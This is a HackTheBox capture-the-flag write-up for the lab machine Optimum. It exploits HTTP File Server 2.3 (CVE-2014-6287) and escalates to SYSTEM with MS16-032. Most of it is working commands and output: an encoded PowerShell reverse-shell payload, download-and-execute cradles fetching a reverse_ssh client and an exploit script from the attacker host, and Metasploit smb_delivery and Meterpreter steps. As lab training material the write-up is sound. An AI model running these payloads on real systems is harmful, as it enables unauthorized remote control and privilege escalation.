---
render_with_liquid: false
title: HackTheBox Writeup  Optimum
date: 2023-09-19 21:41:35 +1400
tags: [hackthebox, nmap, windows, hfs, searchsploit, cve-2014-6287, secondary-logon, ms16-032, cve-2016-0099, metasploit, wesng, reverse-ssh]
---



Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.


# Recon
---

## Nmap

```bash

# Nmap 7.94 scan initiated Tue Sep 19 21:41:35 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 80 10.129.69.103
Nmap scan report for 10.129.69.103
Host is up, received user-set (0.060s latency).
Scanned at 2023-09-19 21:41:35 CST for 12s

PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-server-header: HFS 2.3
|_http-title: HFS /
| http-methods:
|_  Supported Methods: GET HEAD POST
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Sep 19 21:41:47 2023 -- 1 IP address (1 host up) scanned in 11.86 seconds
```

## 80 - HTTP : HttpFileServer 2.3


### Info

![](/assets/obsidian/4afa844f6138b27de0a1be729045bafb.png)


# User Flag
---

## Shell as kostas

### Exploit Http File Server 2.3.x (CVE-2014-6287)

```bash
searchsploit 'HFS 2.3'
```

![](/assets/obsidian/631f5ffb53ddad4d8bc2920028cde302.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Optimum]
└─$ searchsploit -m 49584
  Exploit: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
      URL: https://www.exploit-db.com/exploits/49584
     Path: /usr/share/exploitdb/exploits/windows/remote/49584.py
    Codes: N/A
 Verified: False
File Type: ASCII text, with very long lines (546)
Copied to: /home/kali/htb/Optimum/49584.py
```

Change some variables

```bash
┌──(bravosec㉿fsociety)-[~/htb/Optimum]
└─$ vi 49584.py
```

![](/assets/obsidian/8543de6fdc3c463296609c9f6263b8eb.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Optimum]
└─$ python 49584.py

Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  10.10.14.14
lport:  1111
rhost:  optimum.htb
rport:  80
payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ACIALAAxADEAMQAxACkAOwAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7ACAAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAgAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAIAAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACQAaQApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAgACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACAAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAgACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAgACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

Listening for connection...
listening on [any] 1111 ...
connect to [10.10.14.14] from (UNKNOWN) [10.129.69.103] 49158
PS C:\Users\kostas\Desktop> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ===========================================
optimum\kostas S-1-5-21-605891470-2991919448-81205106-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Users\kostas\Desktop> cat user.txt
a9dec05413e9dc62af529240da4e4ec4
```

# Root Flag
---

## Get stable shell via reverse ssh

> https://github.com/NHAS/reverse_ssh

Start reverse ssh server

```bash
┌──(bravosec㉿fsociety)-[~/htb/Optimum]
└─$ cd /opt/sectools/c2/reverse_ssh/bin && ./server 0.0.0.0:22521
2023/09/19 21:53:30 Loading files from /opt/sectools/c2/reverse_ssh/bin
2023/09/19 21:53:30 Version:  v2.1.5
2023/09/19 21:53:30 Listening on 0.0.0.0:22521
2023/09/19 21:53:30 Loading private key from: /opt/sectools/c2/reverse_ssh/bin/id_ed25519
2023/09/19 21:53:30 Server key fingerprint:  fe76708014a97adea5673c27edf4800c7ec45dc51f90612dfb08593b0ebcd2e2
2023/09/19 21:53:30 Loading authorized keys from: /opt/sectools/c2/reverse_ssh/bin/authorized_keys
2023/09/19 21:53:30 Was unable to read webhooks configuration file
```

Execute client on target

```bash
(new-object net.webclient).DownloadFile("http://10.10.14.14/win/client.exe", "C:\programdata\ssh.exe"); C:\programdata\ssh.exe -d 10.10.14.14:22521
```

Connect to a session

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ ssh 127.0.0.1 -p 22521 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 9853eb6658483378e2a53e6ee7192bae955a4d80 | SSH-v2.1.5-windows_amd64 |
| fc93c7f5275f694f3ebec8fb4c6f02c3aba98b1c |                          |
| optimum.kostas.optimum                   |                          |
| 10.129.69.103:49165                      |                          |
+------------------------------------------+--------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ ssh -J 127.0.0.1:22521 optimum.kostas.optimum
The authenticity of host 'optimum.kostas.optimum (<no hostip for proxy command>)' can't be established.
ED25519 key fingerprint is SHA256:PJ4998W37q0v63SAqd5HV1tgLN2FZsxwqh7fmFWc3RU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:114: [hashed name]
    ~/.ssh/known_hosts:115: [hashed name]
    ~/.ssh/known_hosts:121: [hashed name]
    ~/.ssh/known_hosts:123: [hashed name]
    ~/.ssh/known_hosts:124: [hashed name]
    ~/.ssh/known_hosts:127: [hashed name]
    ~/.ssh/known_hosts:128: [hashed name]
    ~/.ssh/known_hosts:129: [hashed name]
    (13 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'optimum.kostas.optimum' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) 2014 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop>
```

## Secondary Logon Handle Privilege Escalation (MS16-032) (PowerShell)

```bash
PS C:\Users\kostas\Desktop> systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 μμ
System Boot Time:          26/9/2023, 1:32:47 πμ
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 2.079 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 3.229 MB
Virtual Memory: In Use:    2.274 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
...
```

Since `Windows Server 2012 R2` is a very old windows version, search for common exploits first

Google : `windows server 2012 r2 privilege escalation`

![](/assets/obsidian/4970b7a68701b17f87d4bed1690b7cad.png)

> https://www.exploit-db.com/exploits/39719

> Payloadallthethings have good resources for windows privilege escalation
> > https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
{: .prompt-tip }

The exploit is in powershell empire's modules

```bash
┌──(bravosec㉿fsociety)-[~/htb/Optimum]
└─$ grep -rin ms16-032 /opt/sectools/c2/Empire/
/opt/sectools/c2/Empire/empire/server/data/module_source/privesc/Sherlock.ps1:68:    $Global:ExploitTable.Rows.Add("Secondary Logon Handle","MS16-032","2016-0099","https://www.exploit-db.com/exploits/39719/")
/opt/sectools/c2/Empire/empire/server/data/module_source/privesc/Sherlock.ps1:389:    $MSBulletin = "MS16-032"
/opt/sectools/c2/Empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1:1:function Invoke-MS16-032 {
/opt/sectools/c2/Empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1:5:    PowerShell implementation of MS16-032. The exploit targets all vulnerable
...
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Optimum]
└─$ cd www

┌──(bravosec㉿fsociety)-[~/htb/Optimum/www]
└─$ ln -s /opt/sectools/c2/Empire/empire/server/data/module_source/privesc/Invoke-MS16032.ps1
```

Load the exploit on target

```bash
PS C:\Users\kostas\Desktop> iex (new-object net.webclient).downloadstring("http://10.10.14.14/Invoke-MS16032.ps1")
PS C:\Users\kostas\Desktop> Invoke-MS16-032
cmdlet Invoke-MS16-032 at command pipeline position 1
Supply values for the following parameters:
Cmd: 
```

It couldn't spawn a `SYSTEM` shell in current session, so I ran reverse ssh instead

```bash
Cmd: C:\programdata\ssh.exe -d 10.10.14.14:22521
         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handles..
[?] Done, got 1 thread handle(s)!

[?] Thread handle list:
2100

[*] Sniffing out privileged impersonation token..

[?] Trying thread handle: 2100
[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 4124
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

Got a session as `nt authority\system`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Optimum]
└─$ ssh 127.0.0.1 -p 22521 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 8a6cc056ec191cf536e3884004abe5ff275044dc | SSH-v2.1.5-windows_amd64 |
| fc93c7f5275f694f3ebec8fb4c6f02c3aba98b1c |                          |
| nt.authority.system.optimum              |                          |
| 10.129.69.103:49184                      |                          |
+------------------------------------------+--------------------------+
| 9853eb6658483378e2a53e6ee7192bae955a4d80 | SSH-v2.1.5-windows_amd64 |
| fc93c7f5275f694f3ebec8fb4c6f02c3aba98b1c |                          |
| optimum.kostas.optimum                   |                          |
| 10.129.69.103:49165                      |                          |
+------------------------------------------+--------------------------+
```

Connect to the session

```bash
┌──(bravosec㉿fsociety)-[~/htb/Optimum]
└─$ ssh -J 127.0.0.1:22521 nt.authority.system.optimum
The authenticity of host 'nt.authority.system.optimum (<no hostip for proxy command>)' can't be established.
ED25519 key fingerprint is SHA256:PJ4998W37q0v63SAqd5HV1tgLN2FZsxwqh7fmFWc3RU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:114: [hashed name]
    ~/.ssh/known_hosts:115: [hashed name]
    ~/.ssh/known_hosts:121: [hashed name]
    ~/.ssh/known_hosts:123: [hashed name]
    ~/.ssh/known_hosts:124: [hashed name]
    ~/.ssh/known_hosts:127: [hashed name]
    ~/.ssh/known_hosts:128: [hashed name]
    ~/.ssh/known_hosts:129: [hashed name]
    (14 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'nt.authority.system.optimum' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) 2014 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop> whoami
nt authority\system

PS C:\Users\kostas\Desktop> cat C:\Users\Administrator\Desktop\root.txt
5abfd4dfed7d8d8915601190347ee401
```

# Additional
---

## Privilege Escalation with Metasploit

Deliver and execute meterpreter payload

```bash
┌──(bravosec㉿fsociety)-[~/htb/Optimum]
└─$ sudo msfdb start && msfconsole -q -x "use windows/smb/smb_delivery; set SRVHOST tun0; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; run -jz"
```

```bash
[*] Run the following command on the target machine:
rundll32.exe \\10.10.14.14\zbqza\test.dll,0
msf6 exploit(windows/smb/smb_delivery) >
```

```bash
PS C:\Program Files> rundll32.exe \\10.10.14.14\zbqza\test.dll,0
```

```bash
[*] Meterpreter session 1 opened (10.10.14.14:31351 -> 10.129.69.103:49177) at 2023-09-19 22:46:37 +0800

msf6 exploit(windows/smb/smb_delivery) > sessions 1
```

Run exploit suggester

```bash
msf6 exploit(windows/smb/smb_delivery) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(windows/smb/smb_delivery) > use 0
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit
```

Result

```bash
[*] Running check method for exploit 41 / 41
[*] 10.129.69.103 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 4   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 7   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
...
```

Use `MS16-032 Secondary Logon Handle Privilege Escalation` since it's popular

```bash
msf6 exploit(windows/local/tokenmagic) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit
```

```bash
[*] Started reverse TCP handler on 10.10.14.14:4444
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\JZIaMMCB.ps1...
[*] Compressing script contents...
[+] Compressed size: 3731
[*] Executing exploit script...
...
E9sKkEy50EH3HH1ckViz8M4bCsJxJ6yV
[+] Executed on target machine.
[*] Sending stage (175686 bytes) to 10.129.69.103
[*] Meterpreter session 2 opened (10.10.14.14:4444 -> 10.129.69.103:49178) at 2023-09-19 22:54:31 +0800
[+] Deleted C:\Users\kostas\AppData\Local\Temp\JZIaMMCB.ps1

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > cat 'C:\Users\Administrator\Desktop\root.txt'
5abfd4dfed7d8d8915601190347ee401
```


## WESNG Result

> There will be a lot of potentially vulnerable exploits, only try WESNG if most common and general privesc exploits failed
{: .prompt-tip }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Optimum]
└─$ cd /opt/sectools/privesc/wesng

┌──(bravosec㉿fsociety)-[/opt/sectools/privesc/wesng]
└─$ python wes.py /home/kali/htb/Optimum/systeminfo.txt --impact "Elevation of Privilege" -e | tee /home/kali/htb/Optimum/wesng.txt
```

- `-e` : Exploits Only

![](/assets/obsidian/afdddb6a006d74ad5b7bb5ab4f4fe8c9.png)